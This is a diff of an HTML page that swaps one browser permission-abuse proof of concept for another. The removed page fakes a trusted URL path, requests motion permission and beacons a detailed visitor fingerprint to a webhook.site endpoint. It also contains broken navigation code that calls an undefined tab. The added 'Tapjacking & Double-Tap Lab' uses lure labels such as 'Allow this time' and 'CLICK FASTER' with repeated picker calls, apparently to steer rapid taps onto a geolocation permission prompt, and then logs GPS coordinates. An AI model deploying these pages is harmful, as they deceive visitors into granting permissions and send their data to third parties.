@@ -1,143 +1,325 @@
-<!doctype html>
-<html>
-<head>
-<meta charset="utf-8">
-<title>Permission Origin Desync PoC</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<style>
-body{margin:0;font-family:-apple-system,BlinkMacSystemFont,system-ui;background:#f5f5f7;text-align:center}
-button{font-size:15px;padding:12px 16px;border-radius:12px;border:none;background:#007aff;color:#fff;margin:8px}
-#panel{display:none;max-width:420px;margin:80px auto;background:#fff;padding:24px;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.2)}
-.notice{margin-top:14px;font-size:13px;color:#b00020}
-</style>
-</head>
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Tapjacking & Double-Tap Lab</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #121212;
+            color: #e0e0e0;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-end;
+            min-height: 90vh;
+            cursor: pointer;
+        }
+        h1 {
+            color: #ff5252;
+            font-size: 18px;
+            margin-bottom: 5px;
+        }
+        .info-box {
+            background: #1e1e1e;
+            border: 1px solid #333;
+            padding: 10px;
+            border-radius: 6px;
+            max-width: 500px;
+            width: 100%;
+            font-size: 11px;
+            color: #b0b0b0;
+            margin-top: 15px;
+            text-align: left;
+            max-height: 150px;
+            overflow-y: auto;
+        }
+        code { background: #2d2d2d; color: #ff8a80; padding: 2px 4px; border-radius: 3px; font-family: monospace; }
+        .interactive-zone {
+            position: relative;
+            margin-bottom: 20px;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+        }
+    </style>
+</head>
 <body>
 
-<h2 style="margin-top:60px;">Permission Origin Confusion PoC</h2>
-<p>Attacker-controlled page</p>
+    <h1>ðŸ”´ Double-Tap Interaction Labss</h1>
+    <p style="font-size: 12px; color: #888;">Simulasi pengujian respons klik ganda terhadap kemunculan dialog izin.</p>
 
-<button id="start">Start PoC</button>
+    <div class="interactive-zone">
+        <input id="input" type="time" list="times" style="display:none;" />
+        <datalist id="times">
+            <select>
+                <option label="--">00:00</option>
+                <option label="--">00:01</option>
+                <option label="        Allow this time        ">00:02</option>
+                <option label="--">00:03</option>
+                <option label="--">00:04</option>
+                <option label="--">00:05</option>
+                <option label="--">00:06</option>
+                <option label="--">00:07</option>
+                <option label="        CLICK FASTER ðŸ”´        ">00:08</option>
+                <option label="--">CLICK FASTER  ðŸ”´</option>
+                <option label="--">CLICK FASTER  ðŸ”´</option>
+            </select>
+        </datalist>
+    </div>
 
-<div id="panel">
-  <h3>Request Motion Permission</h3>
-  <p>Observe origin shown in permission dialog</p>
-  <button onclick="reqMotion()">🧭 Enable Motion</button>
-  <p id="output">Result: -</p>
-  <div class="notice">Demo only — UI origin may not match JS origin</div>
-</div>
+    <div class="info-box" id="log-box">
+        <strong>Status Log:</strong> Menunggu interaksi klik...
+    </div>
 
 <script>
-/* ================= CONFIG ================= */
-const WEBHOOK = 'https://webhook.site/a43e7707-1ae8-4ac7-af3b-f188526c6b2c';
-const NAV_TARGET = 'https://google.com:9090';
+(() => {
+    "use strict";
 
-const panel  = document.getElementById('panel');
-const output = document.getElementById('output');
+    const logBox = document.getElementById("log-box");
+    const input = document.getElementById("input");
 
-/* ================= PASSIVE GET PROOF (NO RACE IMPACT) ================= */
-function sendProofGET(status){
-  let navType='na', navRedirects='na';
-  try{
-    const n = performance.getEntriesByType('navigation')[0];
-    if(n){ navType=n.type; navRedirects=n.redirectCount; }
-  }catch(e){}
+    let clickCount = 0;
+    let watchId = null;
+    let lastPointerTime = null;
+    let permissionStatus = null;
 
-  const conn = navigator.connection || {};
+    let pickerAttempts = 0;
+    let pickerErrors = 0;
 
-  const params = new URLSearchParams({
-    poc: 'permission-origin-desync',
-    permission: 'motion',
-    status: status,
+    const intervalHistory = [];
+    const MAX_LOGS = 100;
 
-    attacker_origin: location.origin,
-    attacker_url: location.href,
+    function appendLog(msg) {
+        console.log(msg);
 
-    doc_state: document.readyState,
-    visibility: document.visibilityState,
-    has_focus: document.hasFocus(),
-    history_len: history.length,
+        const line = document.createElement("div");
+        line.textContent =
+            `[${new Date().toLocaleTimeString()}] ${msg}`;
 
-    secure_ctx: window.isSecureContext,
-    protocol: location.protocol,
+        logBox.appendChild(line);
+        logBox.scrollTop = logBox.scrollHeight;
 
-    nav_target: NAV_TARGET,
-    nav_type: navType,
-    nav_redirects: navRedirects,
+        while (logBox.children.length > MAX_LOGS) {
+            if (logBox.children.length > 1) {
+                logBox.removeChild(logBox.children[1]);
+            }
+        }
+    }
 
-    // ===== Environment / fingerprint (passive) =====
-    platform: navigator.platform,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    screen_res: screen.width + 'x' + screen.height,
-    color_depth: screen.colorDepth,
-    device_memory: navigator.deviceMemory || 'na',
-    cpu_cores: navigator.hardwareConcurrency || 'na',
-    touch_points: navigator.maxTouchPoints,
-    cookie_enabled: navigator.cookieEnabled,
-    dnt: navigator.doNotTrack || 'na',
+    function activationState() {
+        if (!navigator.userActivation) {
+            return "unavailable";
+        }
 
-    connection_type: conn.effectiveType || 'na',
-    save_data: conn.saveData || false,
+        return JSON.stringify({
+            active: navigator.userActivation.isActive,
+            previouslyActive:
+                navigator.userActivation.hasBeenActive
+        });
+    }
 
-    // timing
-    perf_now_ms: Math.round(performance.now()),
-    ts: Date.now(),
+    async function monitorPermission() {
+        try {
+            permissionStatus =
+                await navigator.permissions.query({
+                    name: "geolocation"
+                });
 
-    ua: navigator.userAgent,
-    lang: navigator.language
-  });
+            appendLog(
+                `[Permission Initial] ${permissionStatus.state}`
+            );
 
-  const img = new Image();
-  img.src =
-    WEBHOOK +
-    '?' + params.toString() +
-    '&poc_version=final' +
-    '&demo_intent=origin_confusion' +
-    '&target_tail=https://google.com:9090' +
-    '&marker=END';
-}
+            permissionStatus.addEventListener("change", () => {
+                appendLog(
+                    `[Permission Changed] ${permissionStatus.state}`
+                );
+            });
 
-/* ================= PERMISSION ================= */
-function reqMotion(){
-  if(typeof DeviceMotionEvent?.requestPermission === 'function'){
-    DeviceMotionEvent.requestPermission()
-      .then(res=>{
-        output.textContent = 'Motion: ' + res;
-        sendProofGET(res);
-      })
-      .catch(()=>{
-        output.textContent = 'Motion denied';
-        sendProofGET('error');
-      });
-  }else{
-    output.textContent = 'Motion API not supported';
-    sendProofGET('unsupported');
-  }
-}
+        } catch (error) {
+            appendLog(
+                `[Permission API Error] ${error.name}: ${error.message}`
+            );
+        }
+    }
 
-/* ================= ATTACK LOGIC ================= */
-/* Step 1: Fake trusted path */
-document.getElementById('start').onclick = () => {
-  history.pushState({}, '', '/trusted/login');
-  panel.style.display = 'block';
-};
+    // Pointer interaction monitoring
 
-/* Step 2: Navigation race (TARGET DI AKHIR) */
-window.addEventListener('pageshow', () => {
-  requestAnimationFrame(() => {
-    requestAnimationFrame(() => {
-      setTimeout(() => {
-        //location.href = 'https://google.com:9090/#https://google.com:9090';
-                    newTab.location.href = "https://apple.com";
+    document.body.addEventListener("pointerdown", (event) => {
 
-      }, 80);
+        const now = performance.now();
+
+        const interval = lastPointerTime === null
+            ? null
+            : Number((now - lastPointerTime).toFixed(2));
+
+        lastPointerTime = now;
+        clickCount++;
+
+        if (interval !== null) {
+            intervalHistory.push(interval);
+
+            if (intervalHistory.length > 100) {
+                intervalHistory.shift();
+            }
+        }
+
+        appendLog(
+            `[Pointer #${clickCount}] ` +
+            `Type=${event.pointerType}, ` +
+            `Trusted=${event.isTrusted}, ` +
+            `Interval=${interval ?? "first"}ms, ` +
+            `Activation=${activationState()}`
+        );
+
+        // Observe picker invocation
+
+        try {
+            pickerAttempts++;
+
+            input.showPicker();
+
+            appendLog(
+                `[Picker Requested] Attempt=${pickerAttempts}`
+            );
+
+        } catch (error) {
+            pickerErrors++;
+
+            appendLog(
+                `[Picker Error] ${error.name}: ${error.message}`
+            );
+        }
+
+        // Interaction threshold observation
+
+        if (clickCount === 9) {
+
+            const averageInterval =
+                intervalHistory.length
+                    ? (
+                        intervalHistory.reduce(
+                            (sum, value) => sum + value, 0
+                        ) / intervalHistory.length
+                    ).toFixed(2)
+                    : "N/A";
+
+            appendLog(
+                "[Interaction Threshold] Nine interactions recorded."
+            );
+
+            appendLog(
+                `[Statistics] Average interval=${averageInterval}ms, ` +
+                `Picker attempts=${pickerAttempts}, ` +
+                `Picker errors=${pickerErrors}, ` +
+                `Permission=${permissionStatus?.state ?? "unknown"}`
+            );
+
+            clickCount = 0;
+        }
+
+    }, { passive: true });
+
+    // Geolocation: explicitly requested by the user
+
+    function requestGeolocation() {
+
+        if (!navigator.geolocation) {
+            appendLog("[Geolocation] API unavailable.");
+            return;
+        }
+
+        if (watchId !== null) {
+            appendLog("[Geolocation] Watch already active.");
+            return;
+        }
+
+        appendLog(
+            `[Geolocation Request] Permission=` +
+            `${permissionStatus?.state ?? "unknown"}`
+        );
+
+        const geoOptions = {
+            enableHighAccuracy: true,
+            timeout: 3000,
+            maximumAge: 0
+        };
+
+        watchId = navigator.geolocation.watchPosition(
+
+            (position) => {
+                appendLog(
+                    `[GPS Result] Lat=${position.coords.latitude}, ` +
+                    `Lon=${position.coords.longitude}, ` +
+                    `Accuracy=${position.coords.accuracy}m`
+                );
+            },
+
+            (error) => {
+                appendLog(
+                    `[Geolocation Error] Code=${error.code}, ` +
+                    `Message=${error.message}`
+                );
+            },
+
+            geoOptions
+        );
+    }
+
+    function stopGeolocation() {
+
+        if (watchId !== null) {
+            navigator.geolocation.clearWatch(watchId);
+            watchId = null;
+
+            appendLog("[Geolocation] Watch stopped.");
+
+        } else {
+            appendLog("[Geolocation] No active watch.");
+        }
+    }
+
+    // Visibility monitoring
+
+    document.addEventListener("visibilitychange", () => {
+        appendLog(
+            `[Visibility] ${document.visibilityState}`
+        );
     });
-  });
-});
+
+    window.addEventListener("blur", () => {
+        appendLog("[Window] Blur detected.");
+    });
+
+    window.addEventListener("focus", () => {
+        appendLog("[Window] Focus restored.");
+    });
+
+    // Initialization
+
+    appendLog("[Lab] Initialized.");
+
+    appendLog(
+        `[Environment] SecureContext=${window.isSecureContext}`
+    );
+
+    appendLog(
+        `[Environment] Geolocation=${!!navigator.geolocation}`
+    );
+
+    appendLog(
+        `[Environment] Browser=${navigator.userAgent}`
+    );
+
+    monitorPermission();
+
+})();
 </script>
 
 </body>
 </html>
-
-
-
